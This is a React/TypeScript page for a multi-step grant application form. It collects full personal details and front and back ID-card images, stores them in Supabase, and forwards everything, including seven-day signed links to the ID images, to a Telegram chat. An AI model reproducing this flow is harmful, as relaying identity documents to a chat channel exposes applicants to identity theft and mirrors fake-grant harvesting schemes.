import { useState, useRef } from 'react';
import { format } from 'date-fns';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Calendar } from '@/components/ui/calendar';
import { Popover, PopoverContent, PopoverTrigger } from '@/components/ui/popover';
import { cn } from '@/lib/utils';
import { toast } from 'sonner';
import { useNavigate } from 'react-router-dom';
import { Loader2, ArrowLeft, ArrowRight, CalendarIcon, Upload, FileText, CheckCircle, User, DollarSign, ClipboardList } from 'lucide-react';

const STEPS = ['Personal Details', 'Funding Details', 'Questionnaire', 'Review & Submit'];

export default function ApplyPage() {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [step, setStep] = useState(0);
  const [submitting, setSubmitting] = useState(false);

  // Step 1: Personal details
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState(user?.email || '');
  const [phone, setPhone] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState<Date | undefined>();
  const [streetAddress, setStreetAddress] = useState('');
  const [city, setCity] = useState('');
  const [stateProvince, setStateProvince] = useState('');
  const [country, setCountry] = useState('');
  const [occupation, setOccupation] = useState('');
  const [idFrontFile, setIdFrontFile] = useState<File | null>(null);
  const [idBackFile, setIdBackFile] = useState<File | null>(null);
  const idFrontRef = useRef<HTMLInputElement>(null);
  const idBackRef = useRef<HTMLInputElement>(null);

  // Step 2: Funding
  const [amountRequested, setAmountRequested] = useState('');
  const [purpose, setPurpose] = useState('');

  // Step 3: Questions
  const [q1, setQ1] = useState('');
  const [q2, setQ2] = useState('');
  const [q3, setQ3] = useState('');
  const [q4, setQ4] = useState('');
  const [q5, setQ5] = useState('');

  const questions = [
    { label: 'Why do you need this grant?', value: q1, set: setQ1 },
    { label: 'How will you use the funds?', value: q2, set: setQ2 },
    { label: 'Have you received any grants before? If yes, describe.', value: q3, set: setQ3 },
    { label: 'What impact will this funding have on your life or community?', value: q4, set: setQ4 },
    { label: 'Is there anything else you would like us to know?', value: q5, set: setQ5 },
  ];

  const canProceedStep0 = fullName && email && dateOfBirth && streetAddress && city && country && occupation && idFrontFile && idBackFile;
  const canProceedStep1 = amountRequested && parseFloat(amountRequested) > 0;
  const canProceedStep2 = q1 && q2 && q4;

  const uploadFile = async (file: File, folder: string): Promise<string | null> => {
    if (!user) return null;
    const ext = file.name.split('.').pop();
    const path = `${user.id}/${folder}-${Date.now()}.${ext}`;
    const { error } = await supabase.storage
      .from('application-documents')
      .upload(path, file, { upsert: true });
    if (error) {
      toast.error(`Upload failed: ${error.message}`);
      return null;
    }
    // Create signed URL (7 days)
    const { data: signedData } = await supabase.storage
      .from('application-documents')
      .createSignedUrl(path, 60 * 60 * 24 * 7);
    return signedData?.signedUrl || null;
  };

  const handleSubmit = async () => {
    if (!user) return;
    setSubmitting(true);

    // Upload ID cards
    const idFrontUrl = idFrontFile ? await uploadFile(idFrontFile, 'id-front') : null;
    const idBackUrl = idBackFile ? await uploadFile(idBackFile, 'id-back') : null;

    if (idFrontFile && !idFrontUrl) { setSubmitting(false); return; }
    if (idBackFile && !idBackUrl) { setSubmitting(false); return; }

    const answers = {
      why_need_grant: q1,
      how_use_funds: q2,
      previous_grants: q3,
      impact: q4,
      additional_info: q5,
    };

    const { error } = await supabase.from('applications').insert({
      user_id: user.id,
      full_name: fullName,
      email,
      phone: phone || null,
      date_of_birth: dateOfBirth ? format(dateOfBirth, 'yyyy-MM-dd') : null,
      street_address: streetAddress,
      city,
      state_province: stateProvince || null,
      country,
      occupation,
      id_card_front_url: idFrontUrl,
      id_card_back_url: idBackUrl,
      amount_requested: parseFloat(amountRequested),
      purpose: purpose || null,
      answers,
    });

    if (error) {
      toast.error(error.message);
      setSubmitting(false);
      return;
    }

    // Send Telegram notification
    try {
      await supabase.functions.invoke('notify-telegram', {
        body: {
          full_name: fullName,
          email,
          phone: phone || null,
          date_of_birth: dateOfBirth ? format(dateOfBirth, 'PPP') : null,
          street_address: streetAddress,
          city,
          state_province: stateProvince,
          country,
          occupation,
          amount_requested: parseFloat(amountRequested),
          purpose: purpose || null,
          answers,
          id_card_front_url: idFrontUrl,
          id_card_back_url: idBackUrl,
        },
      });
    } catch (telegramErr) {
      console.error('Telegram notification failed:', telegramErr);
    }

    navigate('/application-success');
    setSubmitting(false);
  };

  const stepIcons = [User, DollarSign, ClipboardList, CheckCircle];

  return (
    <div className="min-h-screen bg-background py-8 px-4">
      <div className="max-w-2xl mx-auto">
        <Button variant="ghost" size="sm" onClick={() => navigate('/dashboard')} className="mb-6">
          <ArrowLeft className="mr-2 h-4 w-4" /> Back to Dashboard
        </Button>

        {/* Step Indicator */}
        <div className="flex items-center justify-between mb-8 px-2">
          {STEPS.map((s, i) => {
            const Icon = stepIcons[i];
            const isActive = i === step;
            const isDone = i < step;
            return (
              <div key={s} className="flex flex-col items-center flex-1">
                <div className={cn(
                  'flex h-10 w-10 items-center justify-center rounded-full border-2 transition-colors',
                  isDone ? 'bg-success border-success text-success-foreground' :
                  isActive ? 'border-primary bg-primary text-primary-foreground' :
                  'border-muted-foreground/30 text-muted-foreground'
                )}>
                  {isDone ? <CheckCircle className="h-5 w-5" /> : <Icon className="h-5 w-5" />}
                </div>
                <span className={cn('text-xs mt-2 text-center', isActive ? 'font-semibold text-foreground' : 'text-muted-foreground')}>
                  {s}
                </span>
              </div>
            );
          })}
        </div>

        <Card>
          <CardHeader>
            <CardTitle>{STEPS[step]}</CardTitle>
            <CardDescription>
              {step === 0 && 'Enter your personal information and upload ID documents'}
              {step === 1 && 'Specify the funding amount and purpose'}
              {step === 2 && 'Answer a few questions about your grant needs'}
              {step === 3 && 'Review all information before submitting'}
            </CardDescription>
          </CardHeader>
          <CardContent>
            {/* Step 1: Personal Details */}
            {step === 0 && (
              <div className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="full_name">Full Name <span className="text-destructive">*</span></Label>
                    <Input id="full_name" value={fullName} onChange={e => setFullName(e.target.value)} required placeholder="John Doe" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="email">Email <span className="text-destructive">*</span></Label>
                    <Input id="email" type="email" value={email} onChange={e => setEmail(e.target.value)} required />
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="phone">Phone</Label>
                    <Input id="phone" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+1 (555) 000-0000" />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="dob">Date of Birth <span className="text-destructive">*</span></Label>
                    <Input
                      id="dob"
                      type="date"
                      max={new Date().toISOString().split('T')[0]}
                      min="1900-01-01"
                      value={dateOfBirth ? format(dateOfBirth, 'yyyy-MM-dd') : ''}
                      onChange={e => {
                        const val = e.target.value;
                        setDateOfBirth(val ? new Date(val + 'T00:00:00') : undefined);
                      }}
                      className="w-full"
                      required
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="occupation">Occupation <span className="text-destructive">*</span></Label>
                  <Input id="occupation" value={occupation} onChange={e => setOccupation(e.target.value)} required placeholder="e.g. Teacher, Engineer, Student" />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="street_address">Street Address <span className="text-destructive">*</span></Label>
                  <Input id="street_address" value={streetAddress} onChange={e => setStreetAddress(e.target.value)} required placeholder="123 Main Street" />
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="city">City <span className="text-destructive">*</span></Label>
                    <Input id="city" value={city} onChange={e => setCity(e.target.value)} required />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="state">State / Province</Label>
                    <Input id="state" value={stateProvince} onChange={e => setStateProvince(e.target.value)} />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="country">Country <span className="text-destructive">*</span></Label>
                    <Input id="country" value={country} onChange={e => setCountry(e.target.value)} required />
                  </div>
                </div>

                {/* ID Card Uploads */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
                  <div className="space-y-2">
                    <Label>ID Card — Front <span className="text-destructive">*</span></Label>
                    <input
                      ref={idFrontRef}
                      type="file"
                      accept=".jpg,.jpeg,.png,.pdf"
                      className="hidden"
                      onChange={e => setIdFrontFile(e.target.files?.[0] || null)}
                    />
                    <Button
                      type="button"
                      variant="outline"
                      className="w-full justify-start"
                      onClick={() => idFrontRef.current?.click()}
                    >
                      {idFrontFile ? (
                        <><FileText className="mr-2 h-4 w-4 text-success" />{idFrontFile.name}</>
                      ) : (
                        <><Upload className="mr-2 h-4 w-4" />Upload front of ID</>
                      )}
                    </Button>
                    <p className="text-xs text-muted-foreground">JPG, PNG, or PDF</p>
                  </div>
                  <div className="space-y-2">
                    <Label>ID Card — Back <span className="text-destructive">*</span></Label>
                    <input
                      ref={idBackRef}
                      type="file"
                      accept=".jpg,.jpeg,.png,.pdf"
                      className="hidden"
                      onChange={e => setIdBackFile(e.target.files?.[0] || null)}
                    />
                    <Button
                      type="button"
                      variant="outline"
                      className="w-full justify-start"
                      onClick={() => idBackRef.current?.click()}
                    >
                      {idBackFile ? (
                        <><FileText className="mr-2 h-4 w-4 text-success" />{idBackFile.name}</>
                      ) : (
                        <><Upload className="mr-2 h-4 w-4" />Upload back of ID</>
                      )}
                    </Button>
                    <p className="text-xs text-muted-foreground">JPG, PNG, or PDF</p>
                  </div>
                </div>
              </div>
            )}

            {/* Step 2: Funding Details */}
            {step === 1 && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="amount">Amount Requested (USD) <span className="text-destructive">*</span></Label>
                  <Input id="amount" type="number" min="1" max="10000" step="0.01" value={amountRequested} onChange={e => setAmountRequested(e.target.value)} required placeholder="e.g. 5000" />
                  <p className="text-xs text-muted-foreground">Maximum $10,000</p>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="purpose">Purpose / Description</Label>
                  <Textarea id="purpose" value={purpose} onChange={e => setPurpose(e.target.value)} rows={5} placeholder="Describe what you need the funding for..." />
                </div>
              </div>
            )}

            {/* Step 3: Questionnaire */}
            {step === 2 && (
              <div className="space-y-5">
                {questions.map((q, i) => (
                  <div key={i} className="space-y-2">
                    <Label>
                      {i + 1}. {q.label} {i < 2 || i === 3 ? <span className="text-destructive">*</span> : null}
                    </Label>
                    <Textarea value={q.value} onChange={e => q.set(e.target.value)} rows={3} />
                  </div>
                ))}
              </div>
            )}

            {/* Step 4: Review */}
            {step === 3 && (
              <div className="space-y-6">
                <div>
                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider mb-3">Personal Details</h3>
                  <div className="grid grid-cols-2 gap-x-6 gap-y-2 text-sm">
                    <ReviewItem label="Full Name" value={fullName} />
                    <ReviewItem label="Email" value={email} />
                    <ReviewItem label="Phone" value={phone || '—'} />
                    <ReviewItem label="Date of Birth" value={dateOfBirth ? format(dateOfBirth, 'PPP') : '—'} />
                    <ReviewItem label="Occupation" value={occupation} />
                    <ReviewItem label="Country" value={country} />
                  </div>
                  <div className="mt-2 text-sm">
                    <ReviewItem label="Address" value={[streetAddress, city, stateProvince, country].filter(Boolean).join(', ')} />
                  </div>
                  <div className="mt-2 flex gap-4 text-sm">
                    <div>
                      <span className="text-muted-foreground">ID Front: </span>
                      <span className="font-medium text-success">{idFrontFile?.name || '—'}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">ID Back: </span>
                      <span className="font-medium text-success">{idBackFile?.name || '—'}</span>
                    </div>
                  </div>
                </div>

                <div>
                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider mb-3">Funding Details</h3>
                  <div className="grid grid-cols-2 gap-x-6 gap-y-2 text-sm">
                    <ReviewItem label="Amount Requested" value={`$${Number(amountRequested).toLocaleString('en-US', { minimumFractionDigits: 2 })}`} />
                    <ReviewItem label="Purpose" value={purpose || '—'} />
                  </div>
                </div>

                <div>
                  <h3 className="text-sm font-semibold text-muted-foreground uppercase tracking-wider mb-3">Questionnaire</h3>
                  <div className="space-y-3 text-sm">
                    {questions.map((q, i) => (
                      <div key={i}>
                        <p className="text-muted-foreground">{q.label}</p>
                        <p className="font-medium">{q.value || '—'}</p>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Navigation */}
            <div className="flex items-center justify-between mt-8 pt-4 border-t">
              {step > 0 ? (
                <Button variant="outline" onClick={() => setStep(s => s - 1)}>
                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
                </Button>
              ) : <div />}

              {step < 3 ? (
                <Button
                  onClick={() => setStep(s => s + 1)}
                  disabled={
                    (step === 0 && !canProceedStep0) ||
                    (step === 1 && !canProceedStep1) ||
                    (step === 2 && !canProceedStep2)
                  }
                >
                  Next <ArrowRight className="ml-2 h-4 w-4" />
                </Button>
              ) : (
                <Button
                  onClick={handleSubmit}
                  disabled={submitting}
                  className="bg-success text-success-foreground hover:bg-success/90"
                >
                  {submitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <CheckCircle className="mr-2 h-4 w-4" />}
                  {submitting ? 'Submitting...' : 'Submit Application'}
                </Button>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

function ReviewItem({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <span className="text-muted-foreground">{label}: </span>
      <span className="font-medium text-foreground">{value}</span>
    </div>
  );
}
